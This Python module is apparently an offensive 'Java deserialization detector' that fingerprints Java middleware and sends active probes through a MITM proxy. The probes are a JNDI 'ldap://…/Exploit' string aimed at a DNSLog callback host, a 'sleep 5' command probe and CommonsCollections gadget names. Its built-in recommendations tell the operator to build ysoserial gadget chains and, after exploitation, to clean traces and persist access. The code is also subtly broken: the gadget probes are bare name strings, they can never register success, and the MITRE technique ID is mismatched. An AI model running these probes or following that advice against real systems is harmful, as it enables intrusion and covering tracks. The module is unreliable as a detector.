"""Java deserialization vulnerability detector.

Provides:
- Passive detection of Java serialization in proxy traffic
- Active detection with probe payloads
- Fingerprint identification of Java frameworks and middleware
"""

import asyncio
import logging
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class DetectionType(Enum):
    """Detection types."""
    PASSIVE = "passive"
    ACTIVE = "active"


class DetectionStatus(Enum):
    """Detection result status."""
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"
    UNCERTAIN = "uncertain"
    ERROR = "error"


class Protocol(Enum):
    """Java-related protocols."""
    HTTP = "http"
    HTTPS = "https"
    RMI = "rmi"
    JNDI = "jndi"
    LDAP = "ldap"
    T3 = "t3"
    AJP = "ajp"
    IIOP = "iiop"


@dataclass
class DetectionTarget:
    """Detection target configuration.

    Attributes:
        host: Target host
        port: Target port
        protocol: Target protocol
        path: Target URL path
        timeout_seconds: Detection timeout
    """
    host: str = ""
    port: int = 0
    protocol: Protocol = Protocol.HTTP
    path: str = "/"
    timeout_seconds: float = 10.0


@dataclass
class FingerprintResult:
    """Fingerprint identification result.

    Attributes:
        java_version: Detected Java version
        framework: Detected framework
        framework_version: Framework version
        middleware: Detected middleware
        middleware_version: Middleware version
        os_type: Detected operating system
        dependencies: Detected dependencies
        confidence: Detection confidence (0-100)
        indicators: Detection indicators
    """
    java_version: str = ""
    framework: str = ""
    framework_version: str = ""
    middleware: str = ""
    middleware_version: str = ""
    os_type: str = ""
    dependencies: List[Dict[str, str]] = field(default_factory=list)
    confidence: float = 0.0
    indicators: List[str] = field(default_factory=list)


@dataclass
class DetectionResult:
    """Vulnerability detection result.

    Attributes:
        detection_id: Unique detection identifier
        detection_type: Detection type
        target: Detection target
        status: Detection status
        is_vulnerable: Whether target is vulnerable
        vulnerable_entry_points: List of vulnerable entry points
        fingerprint: Fingerprint result
        probe_results: Probe execution results
        dnslog_hits: DNSLog callback hits
        error_message: Error message if failed
        duration_seconds: Detection duration
        timestamp: Detection timestamp
        mitre_technique: MITRE ATT&CK technique ID
        risk_level: Risk level (1-5)
        recommendations: Exploitation recommendations
    """
    detection_id: str = ""
    detection_type: DetectionType = DetectionType.PASSIVE
    target: Optional[DetectionTarget] = None
    status: DetectionStatus = DetectionStatus.UNCERTAIN
    is_vulnerable: bool = False
    vulnerable_entry_points: List[Dict[str, Any]] = field(default_factory=list)
    fingerprint: Optional[FingerprintResult] = None
    probe_results: List[Dict[str, Any]] = field(default_factory=list)
    dnslog_hits: List[Dict[str, Any]] = field(default_factory=list)
    error_message: str = ""
    duration_seconds: float = 0.0
    timestamp: float = 0.0
    mitre_technique: str = "T1566.001"
    risk_level: int = 3
    recommendations: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "detection_id": self.detection_id,
            "detection_type": self.detection_type.value,
            "target_host": self.target.host if self.target else "",
            "target_port": self.target.port if self.target else 0,
            "status": self.status.value,
            "is_vulnerable": self.is_vulnerable,
            "vulnerable_entry_points": self.vulnerable_entry_points,
            "fingerprint": self.fingerprint.__dict__ if self.fingerprint else {},
            "dnslog_hits": self.dnslog_hits,
            "error_message": self.error_message,
            "duration_seconds": self.duration_seconds,
            "mitre_technique": self.mitre_technique,
            "risk_level": self.risk_level,
            "recommendations": self.recommendations,
        }


class JavaDeserDetector:
    """Java deserialization vulnerability detector.

    Provides passive/active detection and fingerprint identification
    for Java deserialization vulnerabilities.
    """

    JAVA_SERIALIZATION_MAGIC = b"\xac\xed\x00\x05"

    JAVA_ERROR_PATTERNS: List[re.Pattern[str]] = [
        re.compile(r"java\.io\.InvalidClassException", re.IGNORECASE),
        re.compile(r"java\.io\.StreamCorruptedException", re.IGNORECASE),
        re.compile(r"java\.lang\.ClassNotFoundException", re.IGNORECASE),
        re.compile(r"java\.lang\.NoClassDefFoundError", re.IGNORECASE),
        re.compile(r"java\.io\.NotSerializableException", re.IGNORECASE),
        re.compile(r"java\.rmi\.MarshalException", re.IGNORECASE),
        re.compile(r"weblogic\.rjvm", re.IGNORECASE),
        re.compile(r"org\.apache\.commons\.collections", re.IGNORECASE),
        re.compile(r"org\.springframework", re.IGNORECASE),
        re.compile(r"com\.fasterxml\.jackson", re.IGNORECASE),
        re.compile(r"com\.alibaba\.fastjson", re.IGNORECASE),
    ]

    MIDDLEWARE_PATTERNS: List[re.Pattern[str]] = [
        re.compile(r"WebLogic Server", re.IGNORECASE),
        re.compile(r"Apache Tomcat", re.IGNORECASE),
        re.compile(r"JBoss", re.IGNORECASE),
        re.compile(r"WebSphere", re.IGNORECASE),
        re.compile(r"Jetty", re.IGNORECASE),
        re.compile(r"Undertow", re.IGNORECASE),
        re.compile(r"GlassFish", re.IGNORECASE),
        re.compile(r"Resin", re.IGNORECASE),
    ]

    FRAMEWORK_PATTERNS: List[re.Pattern[str]] = [
        re.compile(r"Spring Framework", re.IGNORECASE),
        re.compile(r"Struts", re.IGNORECASE),
        re.compile(r"Hibernate", re.IGNORECASE),
        re.compile(r"MyBatis", re.IGNORECASE),
        re.compile(r"Play Framework", re.IGNORECASE),
        re.compile(r"Vaadin", re.IGNORECASE),
    ]

    JAVA_HEADER_PATTERNS: Dict[str, re.Pattern[str]] = {
        "java_version": re.compile(r"Java(?:-Version)?[:\s]*([\d._]+)", re.IGNORECASE),
        "server": re.compile(r"Server[:\s]*([^\r\n]+)", re.IGNORECASE),
        "x_powered_by": re.compile(r"X-Powered-By[:\s]*([^\r\n]+)", re.IGNORECASE),
    }

    PROBE_PAYLOADS: List[Dict[str, Any]] = [
        {
            "name": "DNSLog Probe",
            "type": "jndi",
            "payload": "dnslog",
            "description": "DNSLog callback detection",
        },
        {
            "name": "Sleep Probe",
            "type": "command",
            "payload": "sleep 5",
            "description": "Time-based detection",
        },
        {
            "name": "CC1 Probe",
            "type": "gadget",
            "payload": "CommonsCollections1",
            "description": "CommonsCollections1 gadget probe",
        },
        {
            "name": "CC6 Probe",
            "type": "gadget",
            "payload": "CommonsCollections6",
            "description": "CommonsCollections6 gadget probe",
        },
    ]

    def __init__(
        self,
        mitm_proxy: Optional[Any] = None,
        dnslog_platform: Optional[Any] = None,
        reverse_platform: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize Java deserialization detector.

        Args:
            mitm_proxy: MITM proxy instance for passive detection.
            dnslog_platform: DNSLog platform for OOB detection.
            reverse_platform: Reverse connection platform.
            event_bus: Event bus for broadcasting events.
        """
        self.mitm_proxy = mitm_proxy
        self.dnslog_platform = dnslog_platform
        self.reverse_platform = reverse_platform
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._detection_history: List[DetectionResult] = []
        self._passive_detections: List[Dict[str, Any]] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Detector Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Detector: %s", message)

    async def passive_detect(self, traffic_data: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        """Passively detect Java serialization in traffic.

        Args:
            traffic_data: Traffic data to analyze.

        Returns:
            List of detection findings.
        """
        findings: List[Dict[str, Any]] = []

        try:
            await self._report_progress("被动检测", 10)
            await self._report_log("开始被动检测Java序列化流量...")

            if self.mitm_proxy:
                traffic_data = await self.mitm_proxy.get_recent_traffic()

            if traffic_data:
                findings = await self._analyze_traffic(traffic_data)
            else:
                await self._report_log("无流量数据可分析")

            self._passive_detections.extend(findings)

            await self._report_log(f"被动检测完成: 发现 {len(findings)} 个可疑点")

        except Exception as e:
            await self._report_log(f"被动检测失败: {e}")
            logger.error("Passive detection failed: %s", e)

        return findings

    async def _analyze_traffic(self, traffic_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Analyze traffic for Java serialization indicators.

        Args:
            traffic_data: Traffic data dictionary.

        Returns:
            List of detection findings.
        """
        findings: List[Dict[str, Any]] = []

        try:
            body = traffic_data.get("body", b"")
            headers = traffic_data.get("headers", {})
            url = traffic_data.get("url", "")

            if isinstance(body, bytes) and body[:4] == self.JAVA_SERIALIZATION_MAGIC:
                findings.append({
                    "type": "serialization_magic",
                    "confidence": 95.0,
                    "description": "检测到Java序列化魔数 ac ed 00 05",
                    "url": url,
                })

            content_type = headers.get("Content-Type", "")
            if "x-java-serialized-object" in content_type.lower():
                findings.append({
                    "type": "serialization_header",
                    "confidence": 90.0,
                    "description": "检测到Java序列化Content-Type",
                    "url": url,
                })

            if any(
                pattern.search(str(body))
                for pattern in self.JAVA_ERROR_PATTERNS
                if isinstance(body, (str, bytes))
            ):
                findings.append({
                    "type": "java_error",
                    "confidence": 80.0,
                    "description": "检测到Java异常信息",
                    "url": url,
                })

            protocols = [Protocol.RMI, Protocol.JNDI, Protocol.LDAP, Protocol.T3, Protocol.AJP]
            for proto in protocols:
                if proto.value in url.lower():
                    findings.append({
                        "type": "java_protocol",
                        "confidence": 75.0,
                        "description": f"检测到Java协议: {proto.value}",
                        "url": url,
                        "protocol": proto.value,
                    })

        except Exception as e:
            logger.error("Traffic analysis failed: %s", e)

        return findings

    async def active_detect(
        self,
        target: DetectionTarget,
        use_dnslog: bool = True,
        use_sleep: bool = True,
        use_gadget_probes: bool = True,
    ) -> DetectionResult:
        """Actively detect Java deserialization vulnerability.

        Args:
            target: Detection target.
            use_dnslog: Whether to use DNSLog probes.
            use_sleep: Whether to use sleep probes.
            use_gadget_probes: Whether to use gadget probes.

        Returns:
            DetectionResult.
        """
        start_time = time.time()
        result = DetectionResult(
            detection_id=f"detect_{int(time.time())}",
            detection_type=DetectionType.ACTIVE,
            target=target,
            timestamp=time.time(),
        )

        try:
            await self._report_progress("主动检测", 10)
            await self._report_log(f"开始主动检测: {target.host}:{target.port}")

            await self._report_progress("指纹识别", 20)
            fingerprint = await self.identify_fingerprint(target)
            result.fingerprint = fingerprint

            probe_results: List[Dict[str, Any]] = []

            if use_dnslog:
                await self._report_progress("DNSLog探针", 40)
                dnslog_result = await self._probe_dnslog(target)
                probe_results.append(dnslog_result)
                if dnslog_result.get("success"):
                    result.dnslog_hits.append(dnslog_result)

            if use_sleep:
                await self._report_progress("Sleep探针", 60)
                sleep_result = await self._probe_sleep(target)
                probe_results.append(sleep_result)

            if use_gadget_probes:
                await self._report_progress("Gadget探针", 80)
                gadget_results = await self._probe_gadgets(target)
                probe_results.extend(gadget_results)

            result.probe_results = probe_results

            vulnerable_count = sum(
                1 for p in probe_results if p.get("success", False)
            )

            if vulnerable_count > 0:
                result.status = DetectionStatus.VULNERABLE
                result.is_vulnerable = True
                result.risk_level = 5
                result.recommendations = await self._generate_recommendations(
                    fingerprint,
                    probe_results,
                )
                await self._report_log("检测到反序列化漏洞!")
            else:
                result.status = DetectionStatus.NOT_VULNERABLE
                result.is_vulnerable = False
                await self._report_log("未检测到反序列化漏洞")

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

            self._detection_history.append(result)

        except Exception as e:
            result.error_message = str(e)
            result.status = DetectionStatus.ERROR
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"主动检测失败: {e}")
            logger.error("Active detection failed: %s", e)

        return result

    async def identify_fingerprint(self, target: DetectionTarget) -> FingerprintResult:
        """Identify target fingerprint.

        Args:
            target: Detection target.

        Returns:
            FingerprintResult.
        """
        fingerprint = FingerprintResult()

        try:
            await self._report_log(f"开始指纹识别: {target.host}")

            response = await self._send_probe_request(target)
            if not response:
                return fingerprint

            body = response.get("body", "")
            headers = response.get("headers", {})
            status_code = response.get("status_code", 0)

            for pattern in self.JAVA_ERROR_PATTERNS:
                match = pattern.search(str(body))
                if match:
                    fingerprint.indicators.append(f"Java错误: {match.group(0)}")
                    fingerprint.confidence += 10.0

            for pattern in self.MIDDLEWARE_PATTERNS:
                match = pattern.search(str(body))
                if match:
                    fingerprint.middleware = match.group(0)
                    fingerprint.confidence += 15.0
                    fingerprint.indicators.append(f"中间件: {fingerprint.middleware}")

            for pattern in self.FRAMEWORK_PATTERNS:
                match = pattern.search(str(body))
                if match:
                    fingerprint.framework = match.group(0)
                    fingerprint.confidence += 15.0
                    fingerprint.indicators.append(f"框架: {fingerprint.framework}")

            server_header = headers.get("Server", "")
            if server_header:
                for pattern in self.MIDDLEWARE_PATTERNS:
                    match = pattern.search(server_header)
                    if match:
                        fingerprint.middleware = match.group(0)
                        fingerprint.confidence += 20.0

            x_powered_by = headers.get("X-Powered-By", "")
            if x_powered_by:
                fingerprint.indicators.append(f"X-Powered-By: {x_powered_by}")
                fingerprint.confidence += 5.0

            fingerprint.confidence = min(fingerprint.confidence, 100.0)

            await self._report_log(
                f"指纹识别完成: 中间件={fingerprint.middleware}, "
                f"框架={fingerprint.framework}, "
                f"置信度={fingerprint.confidence:.1f}%"
            )

        except Exception as e:
            await self._report_log(f"指纹识别失败: {e}")
            logger.error("Fingerprint identification failed: %s", e)

        return fingerprint

    async def _send_probe_request(self, target: DetectionTarget) -> Optional[Dict[str, Any]]:
        """Send probe request to target.

        Args:
            target: Detection target.

        Returns:
            Response dictionary or None.
        """
        try:
            if self.mitm_proxy:
                response = await self.mitm_proxy.send_request(
                    host=target.host,
                    port=target.port,
                    path=target.path,
                    method="GET",
                    timeout=target.timeout_seconds,
                )
                return dict(response) if response else None
            return None
        except Exception as e:
            logger.error("Probe request failed: %s", e)
            return None

    async def _probe_dnslog(self, target: DetectionTarget) -> Dict[str, Any]:
        """Probe with DNSLog callback.

        Args:
            target: Detection target.

        Returns:
            Probe result dictionary.
        """
        try:
            if self.dnslog_platform:
                dnslog_url = await self.dnslog_platform.generate_url()
                jndi_payload = f"ldap://{dnslog_url}/Exploit"

                probe_result = {
                    "probe_type": "dnslog",
                    "payload": jndi_payload,
                    "dnslog_url": dnslog_url,
                    "success": False,
                }

                await self._send_probe_with_payload(
                    target,
                    jndi_payload,
                )

                await asyncio.sleep(3)

                hits = await self.dnslog_platform.check_hits(dnslog_url)
                if hits:
                    probe_result["success"] = True
                    probe_result["hits"] = hits

                return probe_result

            return {"probe_type": "dnslog", "success": False, "error": "DNSLog平台未配置"}

        except Exception as e:
            logger.error("DNSLog probe failed: %s", e)
            return {"probe_type": "dnslog", "success": False, "error": str(e)}

    async def _probe_sleep(self, target: DetectionTarget) -> Dict[str, Any]:
        """Probe with sleep command.

        Args:
            target: Detection target.

        Returns:
            Probe result dictionary.
        """
        try:
            start = time.time()

            await self._send_probe_with_payload(
                target,
                "sleep 5",
            )

            elapsed = time.time() - start

            probe_result = {
                "probe_type": "sleep",
                "payload": "sleep 5",
                "elapsed_seconds": elapsed,
                "success": elapsed >= 4.5,
            }

            return probe_result

        except Exception as e:
            logger.error("Sleep probe failed: %s", e)
            return {"probe_type": "sleep", "success": False, "error": str(e)}

    async def _probe_gadgets(self, target: DetectionTarget) -> List[Dict[str, Any]]:
        """Probe with gadget chain payloads.

        Args:
            target: Detection target.

        Returns:
            List of probe results.
        """
        results: List[Dict[str, Any]] = []

        try:
            for probe in self.PROBE_PAYLOADS:
                if probe["type"] == "gadget":
                    probe_result = {
                        "probe_type": "gadget",
                        "gadget_name": probe["name"],
                        "payload": probe["payload"],
                        "success": False,
                    }

                    await self._send_probe_with_payload(
                        target,
                        probe["payload"],
                    )

                    results.append(probe_result)

        except Exception as e:
            logger.error("Gadget probe failed: %s", e)

        return results

    async def _send_probe_with_payload(
        self,
        target: DetectionTarget,
        payload: str,
    ) -> bool:
        """Send probe with payload.

        Args:
            target: Detection target.
            payload: Payload to send.

        Returns:
            True if send successful.
        """
        try:
            if self.mitm_proxy:
                await self.mitm_proxy.send_request(
                    host=target.host,
                    port=target.port,
                    path=target.path,
                    method="POST",
                    body=payload.encode("utf-8"),
                    headers={
                        "Content-Type": "application/x-java-serialized-object",
                    },
                    timeout=target.timeout_seconds,
                )
                return True
            return False
        except Exception as e:
            logger.error("Probe send failed: %s", e)
            return False

    async def _generate_recommendations(
        self,
        fingerprint: FingerprintResult,
        probe_results: List[Dict[str, Any]],
    ) -> List[str]:
        """Generate exploitation recommendations.

        Args:
            fingerprint: Fingerprint result.
            probe_results: Probe results.

        Returns:
            List of recommendation strings.
        """
        recommendations: List[str] = []

        try:
            if fingerprint.middleware:
                recommendations.append(
                    f"目标中间件: {fingerprint.middleware}，建议使用对应利用链"
                )

            if fingerprint.framework:
                recommendations.append(
                    f"目标框架: {fingerprint.framework}，可尝试框架特定漏洞"
                )

            if fingerprint.dependencies:
                deps = ", ".join(
                    d.get("name", "") for d in fingerprint.dependencies
                )
                recommendations.append(f"检测到依赖: {deps}")

            successful_probes = [
                p for p in probe_results if p.get("success", False)
            ]
            if successful_probes:
                recommendations.append(
                    f"成功探针: {', '.join(p.get('probe_type', '') for p in successful_probes)}"
                )

            recommendations.append("建议使用ysoserial生成对应Gadget链Payload")
            recommendations.append("利用后建议清理痕迹并持久化访问")

        except Exception as e:
            logger.error("Recommendation generation failed: %s", e)

        return recommendations

    def get_detection_history(self) -> List[DetectionResult]:
        """Get detection history.

        Returns:
            List of detection results.
        """
        return self._detection_history

    def get_passive_detections(self) -> List[Dict[str, Any]]:
        """Get passive detection findings.

        Returns:
            List of passive detection findings.
        """
        return self._passive_detections

    def get_detection_statistics(self) -> Dict[str, Any]:
        """Get detection statistics.

        Returns:
            Dictionary with statistics.
        """
        total = len(self._detection_history)
        vulnerable = sum(
            1 for d in self._detection_history if d.is_vulnerable
        )

        return {
            "total_detections": total,
            "vulnerable_count": vulnerable,
            "passive_findings": len(self._passive_detections),
            "detection_rate": (vulnerable / total * 100) if total > 0 else 0,
        }
